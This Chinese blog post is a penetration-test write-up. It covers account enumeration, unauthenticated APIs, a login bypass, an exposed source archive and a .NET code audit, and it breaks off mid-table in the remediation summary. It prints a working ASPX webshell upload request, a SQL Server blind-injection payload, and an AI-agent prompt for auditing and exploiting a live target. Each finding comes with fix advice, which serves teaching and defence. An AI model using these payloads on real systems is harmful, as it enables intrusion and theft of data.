#  渗透测试|从账号枚举到未授权访问，再到白盒RCE的一次渗透测试实录  
 flower安全   2026-06-30 07:18  
  
**本篇文章共 8000字，完全阅读全篇约10分钟 州弟学安全，只学有用的知识**  
  
一、前言  
  
**大家好，我是州弟。**  
  
刚结束了陕西省丝绸之路网络安全论坛的分享，回到项目上继续干活。最近发现大家都在关注同一个问题：黑盒渗透测试的门槛越来越高，WAF、EDR、云原生防护层层叠加，传统的大范围扫描基本刚起手就被封禁。但反过来想，防御方堆叠的设备越多，开发和运维在代码层和业务层留下的疏漏往往就越隐蔽，也越有意思。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/mOj9kVLGEa1aibQrD2ib0YaZxGhIVBxg2fUKqiadJdMaPwy8ibhU7RZzdCcy2SOr7iaTuGUsFJH3E3hS9Nmxs7WfxGzIZSdqVtBia3esxBw0yROOA/640?wx_fmt=jpeg&from=appmsg "")  
  
回到正题。这次分享的是一个我们最近帮客户做的授权渗透测试项目。目标是一家企业，互联网暴露面不多，常规扫描基本捞不到什么明显的入口。但渗透测试这件事，很多时候不是看工具多先进，而是看能不能沉下心把有限的面梳理清楚，从一条小程序的接口里找到突破口，再从黑盒的线索过渡到白盒的源码审计，最终拿到服务器的权限。  
  
整个流程走下来，我最大的感受是：黑盒和白盒从来不是割裂的。黑盒划定战场，白盒理解战场上的每一条战壕是怎么挖的。只有两边结合起来，你才能知道漏洞是怎么从一行不严谨的代码，一步步演变成可以远程执行命令的致命风险的。  
  
**本文涉及的所有测试行为均在客户授权范围内进行，目标系统名称、域名、IP、数据均已脱敏，请勿在未授权环境下尝试。**  
## 二、信息收集与目标定位  
  
拿到目标后，照例先做信息收集。这家企业属于个企性质，没有复杂的下属单位或集团架构，所以不需要做股权穿透和关联资产梳理，直接进入到备案查询和资产测绘环节。  
  
由于互联网侧的暴露面确实很少，没有成规模的Web站点，也没有开放的测试环境。我把主要精力放在了小程序上。现在越来越多的企业把核心业务逻辑放在微信小程序里，前端只是展示层，真正的数据交互全靠后端API。这种架构下，小程序的前端代码和后端接口往往是安全链条上最薄弱的环节。  
  
![通过资产测绘工具定位到目标企业的小程序入口，互联网暴露面较少，小程序成为主要测试对象](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa3seKfz6jNlOPu442qnibNxKSc2DibIBIu1d8cjAFn3ggxkF54PclghYvsbqMRmJUjAbGKOQxRV1JdJ1PsOfphaXicKYUUBp16V6U/640?wx_fmt=png&from=appmsg "")  
  
通过资产测绘工具定位到目标企业的小程序入口，互联网暴露面较少，小程序成为主要测试对象  
  
这里顺带提一个知识点。很多师傅在渗透测试初期容易陷入一个误区，就是拿到目标后急着上扫描器，恨不得半小时内出结果。但对于暴露面少的目标，扫描器能覆盖的范围非常有限，反而容易触发封禁。我的习惯是先做人工的资产梳理，把域名、备案、小程序、公众号、App、云存储桶这些面全部列出来，再判断哪个面的概率最高。这次的小程序就是经过这样的筛选后才确定为首要目标的。  
## 三、黑盒测试阶段  
### 3.1 账号枚举  
  
**危害等级：中危**  
  
打开小程序后，首先映入眼帘的是一个登录页面。没有注册入口，也没有找回密码的明显按钮，这意味着所有用户账号都是后台预置的。面对这种封闭系统，我的第一个念头是：先试试账号枚举，看看能不能区分出"账号不存在"和"密码错误"这两种响应。  
  
![小程序登录入口，无注册功能，属于预置账号的封闭系统](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa0KujuVkY8dXicZuHWdThaicib6J84PT9gHDuuJ0Qx0DRCxA73HHHWrkarfiaEz5mxUP38M4TrF84gxjrEgGFjcBkwsq7pIkrCp2Ls/640?wx_fmt=png&from=appmsg "")  
  
小程序登录入口，无注册功能，属于预置账号的封闭系统  
  
我先用 admin  
 作为账号，随意输入一个密码提交。后端返回的响应是"账号或密码错误"。接着我换了一个明显不存在的账号 admin1  
，再次提交。这次后端返回的却是"系统异常"。  
  
![账号存在但密码错误时，后端返回"账号或密码错误"](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa3rPzbaO0UxqmBYb8qIpwfnYolszBOFas7kWnHR2rS26HwAgDXhVgC8SrlDweNTD0Lmkk9Ol45HaEMFBnT3guywyv7YicSXG7YI/640?wx_fmt=png&from=appmsg "")  
  
账号存在但密码错误时，后端返回"账号或密码错误"  
  
![账号不存在时，后端返回"系统异常"，与账号存在时的响应不同](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa1c63czU2ZfgiaGqubVYiaqVlEf867hhLLrLAOyv2CKPLhTsvp207Wt9QhJehNqApMOvjo1YKibcxz0iaxW0hAyeL5eJJFZ5rPlgPM/640?wx_fmt=png&from=appmsg "")  
  
账号不存在时，后端返回"系统异常"，与账号存在时的响应不同  
  
两种截然不同的错误提示，说明后端在账号校验和密码校验的环节没有统一异常处理。账号存在时走到密码比对逻辑，返回密码错误；账号不存在时直接抛出空指针或数据库查询异常，被全局异常拦截器捕获后返回系统异常。这个差异虽然本身不能直接造成数据泄露，但它为后续的暴力破解提供了精准的账号字典。  
  
**修复建议**  
：统一登录失败的响应文案，无论账号是否存在、密码是否正确，均返回"账号或密码错误"。同时建议在登录接口增加速率限制，同一IP或同一账号在短时间内连续失败多次后触发图形验证码或临时锁定。  
### 3.2 未授权访问  
  
**危害等级：高危**  
  
接下来我尝试对小程序进行反编译，提取前端源码中的API接口。这里用到了 TscanPlus 的反编译功能，直接把小程序包解开，提取出所有的后端接口路径。  
  
![通过 TscanPlus 反编译小程序，提取出大量后端 API 路由路径，为后续接口测试提供目标](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa07mafibjNrDfWO1Lew2QpAUm77b4cVnPHsKSuSYsPYn1YDEp2AyKROcFhR3hbW5ObTV9licrXaOfZhrNeIkpGLK3LyZX5iaaagOg/640?wx_fmt=png&from=appmsg "")  
  
通过 TscanPlus 反编译小程序，提取出大量后端 API 路由路径，为后续接口测试提供目标  
  
拿到接口列表后，我用 BurpSuite 对这些接口做了批量 Fuzz。结果发现一个比较严重的问题：接近一半的接口在没有携带任何 Cookie、Token 或鉴权参数的情况下，直接返回了敏感数据。这些数据包括员工工资发放记录、用户ID、手机号等。  
  
![未携带任何凭证直接访问某接口，后端返回了包含员工信息数据列表](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa1XERHZd46g7NsjXVdKnrJwpQ4JibaUxWR0DkUeg5gnrTvEb6GcNtIDpyDmCxjvf3jGic4umuuQzE1q3BHMhTv8v92L6DOrm6TK0/640?wx_fmt=png&from=appmsg "")  
  
未携带任何凭证直接访问某接口，后端返回了包含员工信息数据列表  
  
![未携带任何凭证直接访问某接口，后端返回了包含工资信息的敏感数据列表](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa2SWLtKKs8dibVfMY2Sm2gwtaibNyIZiaExRKyzVMHbWz2HoEevA2AKmmO28Q7iaicb4X5SiadTosghvOb73icAdhorgnfIuONeiapdAbU/640?wx_fmt=png&from=appmsg "")  
  
未携带任何凭证直接访问某接口，后端返回了包含工资信息的敏感数据列表  
  
这说明后端在接口设计上完全没有做身份校验。很多开发者在写小程序接口时，默认前端小程序是"自己人"，不会有人直接调用后端接口，于是省去了鉴权环节。但实际情况是，小程序的前端代码对攻击者来说是完全透明的，反编译之后所有接口都暴露无遗。  
  
**修复建议**  
：所有涉及敏感数据的接口必须接入统一的鉴权中间件，校验请求中携带的 Token 或 Session 是否有效，并确认该用户是否有权限访问当前资源。禁止基于前端隐藏或 obscurity 的访问控制。  
### 3.3 登录鉴权绕过  
  
**危害等级：高危**  
  
未授权访问已经能拿到不少数据，但我心里清楚，真正的危害在于能不能拿到一个合法身份，进入系统内部做更深层的操作。于是我把注意力转回登录接口。  
  
在测试登录的过程中，我注意到响应体里有一个 status  
 字段。前面测试账号枚举时已经看到，无论是账号不存在还是密码错误，这个 status  
 的值都是 1  
。这让我产生了一个想法：如果我在客户端把响应拦截下来，把 status  
 改成 0  
，会发生什么？  
  
![正常登录失败时，响应体中 status 字段值为 1，前端据此判断登录失败](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa2ia2XW82OJJTcvL26kN30gZzM4MMwcOYials5jRjVicA4hoFfibs8InolBvNaxLtNrEqemjyQ7UwrKMLC2Z35r8HuticHQ2n1mMRmw/640?wx_fmt=png&from=appmsg "")  
  
正常登录失败时，响应体中 status 字段值为 1，前端据此判断登录失败  
  
我用 BurpSuite 拦截了登录失败的响应包，把 status  
 从 1  
 改为 0  
，然后放行。  
  
![通过 BurpSuite 拦截响应，将 status 字段修改为 0 后放行](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa3FAnbwPtfpChibadPfMqfGJFJ9VXdp9cyEibdzzCyUhhKiabyDXmZR4pfVIwUICiaKyLOmRwpvRiazn6OkS7orHqvwIywQib8jIQG6U/640?wx_fmt=png&from=appmsg "")  
  
通过 BurpSuite 拦截响应，将 status 字段修改为 0 后放行  
  
结果出乎意料。前端收到 status=0  
 后，直接认为登录成功，跳转进了小程序的主界面。虽然后端并没有返回任何 Cookie、Token 或 SessionID，但前端的所有功能模块都已经对我开放了。我可以正常浏览、操作、提交数据。  
  
![前端仅依据 status 字段判断登录状态，修改后成功绕过登录限制进入系统](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa0cqrm2oomOMyd2W9F3oqspEOSiafrN9xfF5GriaTAEIenI8FyzvKKJBL1FN06rRC9WCb4hcECl8ydicXYUQdU2nWkIKcEvqXXVF4/640?wx_fmt=png&from=appmsg "")  
  
前端仅依据 status 字段判断登录状态，修改后成功绕过登录限制进入系统  
  
进去之后我随手点了点工资管理模块，发现增删改查全部可以操作。  
  
![绕过登录后，可直接对工资数据进行增删改查操作，业务权限未做后端校验](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa0nicBN2hjkK9pJaP6n4u0zRX5m5icRqp0D2joOg9jgn3yIRfgQUSWtRYpQeT93s9jicz0I44W5XbDrF4zdbAqAeW1fjjm5xn21lY/640?wx_fmt=png&from=appmsg "")  
  
绕过登录后，可直接对工资数据进行增删改查操作，业务权限未做后端校验  
  
更离谱的是，我在个人设置里看到了修改密码的功能，而这个功能居然不需要输入原密码，直接输入新密码就能提交成功。  
  
![系统提供的修改密码功能未要求输入原密码，存在严重的逻辑缺陷](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa2Pt8icsfpyPu0pOgEJyZW4jAecJqXvbXfV6lj8brIKZpdnMibwbMdsbm6tNGmLhI1NJbkNliaOE4EQDkdu58SLPzjvYwlicvrxLfc/640?wx_fmt=png&from=appmsg "")  
  
系统提供的修改密码功能未要求输入原密码，存在严重的逻辑缺陷  
  
这个发现让我停下来想了一下。前端校验绕过在很多系统里都存在，但通常后端还会再做一次校验。而这个系统的问题在于，前端把 status  
 作为唯一的状态标识，后端则完全依赖前端传递的状态，或者根本没有在后续请求中校验用户身份。这种前后端信任链的断裂，是典型的逻辑漏洞。  
  
**修复建议**  
：登录状态必须由后端生成并维护，通过 HTTP Only Cookie 或安全的 Token 机制下发给前端。前端可以缓存状态以提升体验，但每一个涉及敏感操作的接口都必须独立校验后端凭证。修改密码等高危操作必须强制验证原密码或二次身份验证。  
### 3.4 根目录的意外发现  
  
黑盒测试到这里，逻辑漏洞已经挖得差不多了。但我心里一直有个念头：能不能再进一步，拿到服务器权限？小程序是黑盒，看不到后端架构，也没有明显的上传点或框架特征。我试着访问了一下域名的根路径，想看看有没有目录遍历或者默认页面暴露信息。  
  
结果让我愣了一下。根目录居然可以直接访问，而且里面放着一个源码压缩包。  
  
![访问目标域名根路径，发现可直接列目录，且存在完整的源码压缩包](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa0BJX7VAsL6EeiakQ1JBZVkpxG8bWgOeicWlkQA9Aq1Yf1bJEOVciayAUJguoLPDmNgylLgNq4VIg15xChqZ8xbv9jjCz57TIespA/640?wx_fmt=png&from=appmsg "")  
  
访问目标域名根路径，发现可直接列目录，且存在完整的源码压缩包 code.rar  
  
这里需要解释一个细节。我们平时访问小程序，请求的 URL 通常是 http://target.com/API/xxx/xxxlist  
 这种形式，很少会有人去访问 http://target.com/  
 这个根路径。开发者和运维也往往会忽略对根目录的权限管控，认为"反正用户不会访问这里"。但渗透测试恰恰需要这种"非常规"的访问习惯，把每一级目录都递归访问一遍，很多时候会有意外收获。  
  
拿到源码压缩包后，整个项目的性质就从黑盒变成了白盒。我知道后端是 .NET 技术栈，WebAPI 架构，SQL Server 数据库。接下来的工作就是反编译和代码审计。  
## 四、白盒代码审计阶段  
### 4.1 反编译与审计思路  
  
下载源码压缩包后解压，发现里面主要是 bin/  
 目录下的 DLL 文件。这说明下载的是编译后的发布包，而不是原始工程文件。对于 .NET 程序来说，这不算太大的障碍，因为 dnSpy 可以很好地反编译 IL 代码，还原出接近原始的 C# 源码。  
  
![源码压缩包内为 .NET 编译后的发布文件，核心逻辑集中在多个 DLL 中](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa1eBY6ibT76Q1Zeicib5HAgia4HtfIS7frbrAibk3X358gWDn6icCZA3G2UqicDk6iaqZ3Kd71pI27AsRJMSbtV0fbUjnahIcRfBOOI7Ps/640?wx_fmt=png&from=appmsg "")  
  
源码压缩包内为 .NET 编译后的发布文件，核心逻辑集中在多个 DLL 中  
  
![将 dnSpy 和源码包放在同一目录下，准备对 DLL 进行批量反编译分析](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa0tdwztzbYCVPGDibBowqkKH2ibsxCSm1kbzBjU6qUQ72Fx0PWWrDUAXONQdDZzJceyuDFjuqysvE8xOg5YiaP1ic4aAxeiavZpjfCs/640?wx_fmt=png&from=appmsg "")  
  
将 dnSpy 和源码包放在同一目录下，准备对 DLL 进行批量反编译分析  
  
在开始审计之前，我先用 AI 辅助做了一个审计规划。这里我把提示词贴出来，供有类似需求的师傅参考。这个提示词的核心思路是：不给大模型过于死板的任务清单，而是让它自主规划审计路径，同时明确漏洞类型和输出要求，避免遗漏。  
```
你现在是一名具有非常丰富的代码审计工程师，你接下来需要按照如下进行代码审计：1. 当前目录下的 code.rar 你需要进行解压到一个目录中，先了解其文件目录层级、语言等；2. 自主进行规划，使用当前目录下的 dnspy 工具对所有 dll 文件进行反编译处理；3. 确认所有文件反编译成功后，可以开启多个 agent 进行全量代码审计，审计漏洞范围包括不限于：   水平越权、垂直越权、IDOR、强制浏览、CORS 配置错误、   SQL 注入、NoSQL 注入、OS 命令注入、LDAP 注入、XPath 注入、表达式注入、模板注入、CRLF 注入、日志注入、   暴力破解、凭证填充、弱口令、会话固定、密码重置缺陷、MFA 绕过、JWT 漏洞、硬编码凭证、   自动更新无签名、反序列化、依赖篡改、CI/CD 完整性缺失、   错误信息泄露、Fail-Open、空指针、资源耗尽、SSRF 等漏洞；4. 在代码审计完毕后需要对其进行测试验证，目标地址为：http://xxxx.com/，确定漏洞存在之后再输出对应报告；5. 报告需要包含：存在问题的文件、对应代码问题、测试 POC 以及修复建议等。
```  
  
这里多说一句。有些师傅觉得给 AI 列太多漏洞类型会限制它的发挥，但我实际用下来的感受是：如果你不给示例，AI 在审计过程中确实会出现遗漏。比如它可能扫完了 SQL 注入和越权，但完全没提文件上传。这不是 AI 能力问题，而是上下文窗口和注意力分配的问题。所以我的做法是：先给一份全面的漏洞类型清单让 AI 做第一轮扫描，然后再针对特定类型做第二轮深度追问。这样两轮下来，覆盖率会高很多。  
  
反编译完成后，我得到了接近 400 个 C# 源文件。接下来进入正式的漏洞分析。  
  
注：以下代码审计过程我将大模型审计完毕且成功利用的结果以手工图示的方式进行展示  
### 4.2 任意文件上传至 RCE  
  
**危害等级：严重**  
  
在反编译后的 CommonController.cs  
 中，定位到了一个全局文件上传方法 FileUpload  
。这个方法的参数签名是：  
```
public Task<Hashtable> FileUpload(string Filetype, string Type, string ID)
```  
  
从代码逻辑看，它支持两种文件类型：Filetype=0  
 代表图片上传，Filetype=1  
 代表视频上传。上传的图片会被保存到 Upload/Photo/日期/  
 目录下，视频则保存到 Upload/Video/日期/  
 目录下。  
  
![CommonController.cs 中的 FileUpload 方法，根据 Filetype 参数决定保存目录为 Photo 或 Video](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa2UNLNibUFLic65fOzIepg3QrO6THqA22Xg4NlTAK47QCTmutXlh5vgsAJKWWGI02GAmmKjsmfQCS0RxSqyHCPXaas3r6VaBOYY8/640?wx_fmt=png&from=appmsg "")  
  
CommonController.cs 中的 FileUpload 方法，根据 Filetype 参数决定保存目录为 Photo 或 Video  
  
继续往下读代码，这里发现了一个非常典型的逻辑分支遗漏。当 Filetype=0  
（图片模式）时，后端对文件扩展名做了白名单校验，只允许 gif、jpg、jpeg、png、bmp  
 这几种格式。  
  
![Filetype=0 时，后端对文件扩展名进行白名单校验，仅允许常见图片格式](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa1Q5Rpu7wKneYeknhnpY1UqJLRHNrA6DZ8P9piakGhKd6iaZ86ZlqPCctkL3oxzhbgz26FkG1I2EYib7Pr399ia1SKrWdLv0RDMH08/640?wx_fmt=png&from=appmsg "")  
  
Filetype=0 时，后端对文件扩展名进行白名单校验，仅允许常见图片格式  
  
但当 Filetype=1  
（视频模式）时，代码直接进入了 else  
 分支，没有任何扩展名校验，只是生成一个随机 GUID 作为文件名，然后直接调用 fileinfo.CopyTo()  
 保存到 Upload/Video/  
 目录下。  
  
![Filetype=1 时，代码直接保存文件，未对扩展名进行任何白名单或黑名单校验](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa1ZbVkHRlcZPjDqk3T8oFLpdxxOxRLJOibibwNpt5xOFPH6CAWq9qtTRDDoFMOGD2y3zQLzVcDibuBYc9Rq97o5tJITeqsV5LUQxI/640?wx_fmt=png&from=appmsg "")  
  
Filetype=1 时，代码直接保存文件，未对扩展名进行任何白名单或黑名单校验  
  
这个发现可以意识到，这是一个典型的"白名单绕过"场景，但绕过的方式不是构造特殊文件名，而是直接利用业务逻辑的分支差异。开发者可能认为"视频上传"和"图片上传"是两个完全不同的业务场景，视频不会被浏览器解析，所以不需要做严格的类型校验。但他忽略了一个关键点：IIS 服务器上，.aspx  
 文件无论放在哪个目录下，只要处于 Web 根目录内，都会被 ASP.NET 引擎解析执行。  
  
于是构造 POC。通过 Filetype=1  
 触发视频上传分支，上传一个 .aspx  
 的 WebShell：  
```
POST /api/Common/FileUpload?Filetype=1&Type=0&ID=1 HTTP/1.1Host: targetContent-Type: multipart/form-data; boundary=X--XContent-Disposition: form-data; name="file"; filename="shell.aspx"Content-Type: application/octet-stream<%@ Page Language="C#" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();%>--X--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa3u0fOB5x08ibWCX3WS6thgsFMIicgc7QiciaiaWW772ia1pzYT65WKEo89LPXMJNhnVyfEAs2sDIGoK1ZCq7SeJ9guweoXgLIdsS9B8/640?wx_fmt=png&from=appmsg "")  
  
通过 Filetype=1 分支上传 shell.aspx，后端返回上传成功，文件已保存至 Video 目录  
  
上传成功后，直接访问返回的文件路径，执行 ping  
 命令发现可以出网：  
  
![通过浏览器访问上传的 aspx 文件并传入 cmd 参数，成功执行 ping](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa0pDhjHmjtIh3tVWXUZlIfBB3MotQ2WAoG6BQDdAo73VONLHmkzHD9JtD6UWEo2cnrMYoS5mTcepcjDTZy23H1o2MibCeroe3lE/640?wx_fmt=png&from=appmsg "")  
  
通过浏览器访问上传的 aspx 文件并传入 cmd 参数，成功执行 ping  
  
拿到 Shell 权限的那一刻，当时非常兴奋，过后反而冷静了下来，思考一下这个漏洞的典型之处：一个 if-else  
 分支里，前半段有校验，后半段完全放开。这种漏洞在代码审计中非常常见，但黑盒测试几乎不可能发现，因为你不知道后端有两个分支，也不知道视频上传接口会接受什么文件。这就是白盒审计的价值所在。  
  
**修复建议**  
：所有文件上传接口必须统一进行扩展名白名单校验，且白名单应由安全配置中心统一下发，不允许各业务分支自行决定是否校验。同时，上传目录应设置为不可执行权限，或者将用户上传的文件存储在 Web 根目录之外，通过专门的文件服务（如 OSS、CDN）进行访问，避免上传文件被解析执行。  
### 4.3 SQL 注入  
  
**危害等级：严重**  
  
拿到源码后，SQL 注入是重点关注的方向。在 .NET 项目中，SQL 注入的排查有一个相对固定的模式：先找 DAL 层（数据访问层），看有没有直接拼接 SQL 字符串的方法，再往上追溯到 Controller 层，看用户输入是怎么流进这些方法的。  
  
在 GSDsystem.DAL  
 命名空间下搜索 DbHelperSQL  
，很快发现了一个高危模式：GetSelectList(string strWhere)  
 这个方法在多个 DAL 类中重复出现，它的内部实现都是把 strWhere  
 参数直接拼接到 SQL 语句的 WHERE  
 子句中，没有任何参数化处理。  
  
![Sys_User.cs 中的 GetSelectList 方法，将传入的 strWhere 直接拼接到 SQL 字符串中，未使用 SqlParameter](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa1CNhbz1QVQFGYfK8NriceicSVrbAkPjN9EDGWq5aAff88g1ictXibubiawvN0yIsCib0GP2VSnoCKsbUc6p5V16ibQgrtKvzULsxFmQM/640?wx_fmt=png&from=appmsg "")  
  
Sys_User.cs 中的 GetSelectList 方法，将传入的 strWhere 直接拼接到 SQL 字符串中，未使用 SqlParameter  
  
进一步全局搜索 GetSelectList  
，发现基于这个方法的查询调用在项目中普遍存在，无一例外都是直接拼接 WHERE  
 语句。  
  
![项目中大量 Controller 调用 GetSelectList，且均传入用户可控的参数构造 strWhere](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa2TjdN24NZkGREuQ4ojeSB26eYHeEPF2oZ8hVYuy9gE5eibLWqgXpAFYhGZ6zfenEEyFIgEubo1bONT52ic4ia7JGaZNiaRn3XRR7A/640?wx_fmt=png&from=appmsg "")  
  
项目中大量 Controller 调用 GetSelectList，且均传入用户可控的参数构造 strWhere  
  
既然 DAL 层是危险方法，下一步就是往 Controller 层追溯，看谁调用了它，以及调用时传入的 strWhere  
 是怎么构造的。以 CommonController.GetWareHouseList  
 为例：  
```
string GUID = obj.GUID;string Where = " GUID='" + GUID + "'";DataSet dsData = new GSDsystem.DAL.tb_WareHouses().GetSelectList(Where);
```  
  
obj.GUID  
 来自前端 POST 的 JSON 数据，没有任何过滤或类型校验，直接拼进了 SQL 条件。完整的攻击链路如下：  
```
用户 POST JSON {"GUID":"evil"}  → obj.GUID 取值（无过滤）  → 拼入 Where = " GUID='" + GUID + "'"  → 传参 GetSelectList(Where)  → DAL 层拼成 "select ... from tb_WareHouses where GUID='evil'"  → DbHelperSQL.Query() 执行  → SQL 注入
```  
  
![CommonController.cs 中直接拼接用户传入的 GUID 参数，传入 DAL 层的危险方法](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa1icOPy7bovEQurV9AjgoIibUSuJeSIicRTY9b1KdkXcTp7ZlwGBHDuVp50dAQ2dar8RggRnWqMm1DRmtsia4PRiceEiaia8JBHwulbd4/640?wx_fmt=png&from=appmsg "")  
  
CommonController.cs 中直接拼接用户传入的 GUID 参数，传入 DAL 层的危险方法  
  
接下来需要确认接口的 URL 路径。打开 WebApiConfig.cs  
，可以看到项目使用了标准的 ASP.NET WebAPI 路由模板：  
  
![路由模板为 api/{controller}/{action}/{id}，因此 CommonController.GetWareHouseList 对应 /api/Common/GetWareHouseList](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa36UZb5VHIcZtxUoNOEAdexXa3hBoClB1GKLYEflaeVia40wCicIruI780k84lYnYgpI9eVICKbq1VGrmePH61KzHbqsUlWL2Tmc/640?wx_fmt=png&from=appmsg "")  
  
路由模板为 api/{controller}/{action}/{id}，因此 CommonController.GetWareHouseList 对应 /api/Common/GetWareHouseList  
  
根据路由规则，CommonController.GetWareHouseList  
 对应的访问路径就是 POST /api/Common/GetWareHouseList  
。构造时间盲注 POC：  
```
POST /api/Common/GetWareHouseList HTTP/1.1Host: target.comContent-Type: application/json{"GUID":"1'; WAITFOR DELAY '0:0:5'--"}
```  
  
![通过构造时间盲注 Payload，成功触发 5 秒延迟，确认 SQL 注入漏洞存在](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa0T1rODsUcCSZmC6WHPL9zIBO8A470gN23pUT9uDcYyeKgaXUjNTm9AlZYMn7nGkpKkwueicIbzoEbxMRy2tpWapx3MUANIcv5E/640?wx_fmt=png&from=appmsg "")  
  
通过构造时间盲注 Payload，成功触发 5 秒延迟，确认 SQL 注入漏洞存在  
  
实际上，经过完整的代码审计，可以发现项目中基于 GetSelectList  
、GetListExpand  
、GetRecordCount  
 等危险方法的 SQL 注入点共有 11 处，分布在 CommonController  
、WechatController  
 和 PDAClientController  
 中。这些注入点全部可以线上验证，且数据库为 SQL Server，支持 WAITFOR DELAY  
 时间盲注和 xp_cmdshell  
 等高级利用。  
  
**修复建议**  
：立即对所有 DAL 层的方法进行参数化查询改造，使用 SqlParameter  
 传递所有用户输入，禁止任何形式的字符串拼接构造 SQL。对于遗留的 strWhere  
 模式，应逐步废弃，改为强类型的查询对象或 ORM 框架（如 Entity Framework、Dapper）的参数化查询方式。  
### 4.4 硬编码密钥与数据库凭证  
  
**危害等级：高危**  
  
在审计过程中，还做了另一个方向的排查：硬编码敏感信息。很多开发者在代码中习惯把密钥、连接串、私钥直接写死在常量里，认为编译成 DLL 后就没人能看到了。但反编译工具可以非常轻松地还原这些字符串。  
  
全局搜索 PRIKEY  
，在 AppConstants.cs  
 中直接拿到了 RSA 2048 位的私钥，以及支付接口的 APPID  
 和 CUSID  
。  
  
![反编译后可直接查看 AppConstants.cs 中的明文私钥和支付接口配置信息](https://mmbiz.qpic.cn/sz_mmbiz_png/mOj9kVLGEa0gp0cq0KMrO3rq3QiaSuSXuN34puCmK2YXPVJT4UzTu7vPV1VKcJDWguuHBIFZg4Yeasr2zzg7Ny0x9c4qaduiazPgkiaXqgKOsM/640?wx_fmt=png&from=appmsg "")  
  
反编译后可直接查看 AppConstants.cs 中的明文私钥和支付接口配置信息  
  
继续搜索数据库连接串，在 PubConstant.cs  
 中找到了经过 DES 加密的数据库连接串，但加密密钥也是硬编码的 GSDsystem  
。用同样的密钥解密后，直接拿到了数据库的 IP、库名、账号和密码。  
  
![数据库连接串使用 DES 加密，但密钥硬编码在代码中，解密后可获取完整的数据库访问凭证](https://mmbiz.qpic.cn/mmbiz_png/mOj9kVLGEa2Ze5UKhOSXTLdNDtogVl3M43UGja6aUyFPrrpjvFZkSxSRJOte23qQ0MwglXvsND7bbiccQOXEf7k3Va5PDmtJ8L22fEW1kdicg/640?wx_fmt=png&from=appmsg "")  
  
数据库连接串使用 DES 加密，但密钥硬编码在代码中，解密后可获取完整的数据库访问凭证  
  
这里需要强调一个认知误区。有些开发者觉得"我加密了连接串，所以是安全的"。但问题在于，密钥和密文放在同一个文件里，反编译后攻击者可以同时拿到两者，加密就形同虚设。正确的做法是把密钥放在独立的密钥管理服务（KMS）或硬件安全模块（HSM）中，应用程序运行时通过受控的 API 获取，而不是把密钥和密文绑在一起分发。  
  
**修复建议**  
：所有密钥、连接串、私钥等敏感信息必须从代码中移除，迁移到环境变量、配置中心或 KMS 中。代码仓库中不应出现任何生产环境的凭证信息。对于已泄露的密钥，应立即轮换。  
## 五、修复建议汇总  
  
把这次审计发现的问题归类后，我们给客户提交了一份修复优先级清单：  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">优先级</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">漏洞类型</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none left top / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">修复要点</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">P0</span></section></td><td style="padding-top: 5px;padding-right: 